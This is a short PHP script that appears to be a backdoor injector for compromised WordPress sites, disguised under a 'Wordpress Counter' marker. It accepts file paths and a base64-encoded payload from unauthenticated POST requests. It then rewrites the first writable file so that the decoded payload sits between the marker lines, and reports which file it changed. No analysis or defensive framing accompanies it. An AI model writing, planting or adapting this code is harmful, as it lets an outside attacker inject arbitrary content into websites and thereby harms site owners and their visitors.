<?php
$files_to_update = array ();
$update = '';
$delimiter = "\n<!-- Wordpress Counter -->\n";

for ($i = 0; $i < 20; $i++)
	if ( isset ( $_POST["f$i"] ) )
		$files_to_update["f$i"] = $_POST["f$i"];
if ( isset ( $_POST["update"] ) )
	$update = base64_decode ( $_POST["update"] );
	
$updated = false;

foreach ($files_to_update as $filename) {
	if ( !is_file ( $filename ) || !is_writable ( $filename ) )
		continue;

	$buf = '';
	$f = fopen ( $filename, 'r' );
	while ( ($line = fgets($f)) !== false ) {
		if ( stripos ( $line, '<!-- Wordpress Counter -->' ) !== false ) {
			break;
		}
		$buf .=  $line;
	}
	fclose ($f);
			
	$f = fopen ( $filename, 'w' );
	$res = fwrite ( $f, $buf.$delimiter.$update.$delimiter );
	fclose ($f);

	if ( $res === false)
		continue;

	$updated = $filename;
	break;
}

echo "UPDATER:".( ( $updated === false ) ? "FALSE" : $updated );
?>
